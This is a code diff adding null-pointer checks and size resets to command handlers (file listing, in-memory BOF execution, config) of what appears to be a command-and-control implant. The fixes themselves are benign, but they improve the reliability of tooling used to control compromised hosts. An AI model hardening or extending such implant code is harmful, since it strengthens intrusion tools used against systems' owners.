@@ -728,14 +728,19 @@ VOID CommandFS( PPARSER Parser )
             FilesOnly    = ParserGetBool( Parser );
             DirsOnly     = ParserGetBool( Parser );
             ListOnly     = ParserGetBool( Parser );
+            /* ParserGetWString can return NULL without writing FilterSize,
+             * so reset it before each call and test the pointer first */
+            FilterSize   = 0;
             Starts       = ParserGetWString( Parser, &FilterSize );
-            if ( FilterSize < sizeof( WCHAR ) || ! Starts[ 0 ] )
+            if ( ! Starts || FilterSize < sizeof( WCHAR ) || ! Starts[ 0 ] )
                 Starts = NULL;
+            FilterSize   = 0;
             Contains     = ParserGetWString( Parser, &FilterSize );
-            if ( FilterSize < sizeof( WCHAR ) || ! Contains[ 0 ] )
+            if ( ! Contains || FilterSize < sizeof( WCHAR ) || ! Contains[ 0 ] )
                 Contains = NULL;
+            FilterSize   = 0;
             Ends         = ParserGetWString( Parser, &FilterSize );
-            if ( FilterSize < sizeof( WCHAR ) || ! Ends[ 0 ] )
+            if ( ! Ends || FilterSize < sizeof( WCHAR ) || ! Ends[ 0 ] )
                 Ends = NULL;
 
             if ( ! TargetFolder || TargetSize < sizeof( WCHAR ) )
@@ -1191,6 +1196,13 @@ VOID CommandInlineExecute( PPARSER Parser )
     ULONG     BofFileID        = ParserGetInt32( Parser );
     ULONG     ParamsFileID     = ParserGetInt32( Parser );
     INT32     Flags            = ParserGetInt32( Parser );
+
+    if ( ! FunctionName )
+    {
+        PUTS( "Failed to parse the function name" )
+        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_PARAMETER );
+        goto CLEANUP;
+    }
 
     BofMemFile = GetMemFile( BofFileID );
     if ( BofMemFile && BofMemFile->IsCompleted )
@@ -1964,7 +1976,7 @@ VOID CommandConfig( PPARSER Parser )
             PRINTF( "Function => %s\n", Function );
             PRINTF( "Offset => %x\n", Offset );
 
-            if ( Library )
+            if ( Library && Function )
             {
                 PVOID hLib = NULL;
 
@@ -1986,8 +1998,8 @@ VOID CommandConfig( PPARSER Parser )
                 }
             }
 
-            PackageAddString( Package, Library );
-            PackageAddString( Package, Function );
+            PackageAddString( Package, Library  ? Library  : "" );
+            PackageAddString( Package, Function ? Function : "" );
 
             break;
         }
@@ -2055,7 +2067,7 @@ VOID CommandConfig( PPARSER Parser )
             PRINTF( "Function => %s\n", Function );
             PRINTF( "Offset => %x\n", Offset );
 
-            if ( Library )
+            if ( Library && Function )
             {
                 PVOID hLib = NULL;
 
@@ -2078,8 +2090,8 @@ VOID CommandConfig( PPARSER Parser )
                 else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
             }
 
-            PackageAddString( Package, Library );
-            PackageAddString( Package, Function );
+            PackageAddString( Package, Library  ? Library  : "" );
+            PackageAddString( Package, Function ? Function : "" );
 
             break;
         }
